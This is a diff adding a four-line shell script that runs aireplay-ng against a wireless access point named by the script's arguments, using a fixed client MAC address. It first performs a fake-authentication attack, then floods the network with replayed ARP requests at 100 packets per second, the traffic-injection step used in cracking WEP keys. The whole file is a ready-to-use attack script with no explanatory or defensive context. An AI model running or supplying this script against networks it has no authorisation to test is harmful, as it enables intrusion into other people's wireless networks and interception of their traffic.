@@ -1,0 +1,4 @@
+#!/bin/sh
+aireplay-ng -1 0 -e "$1" -b $2 -h 00:15:af:e2:95:d3 ath1
+echo "$1"
+aireplay-ng -3 -e "$1" -b $2 -h 00:15:af:e2:95:d3 -x 100 ath1
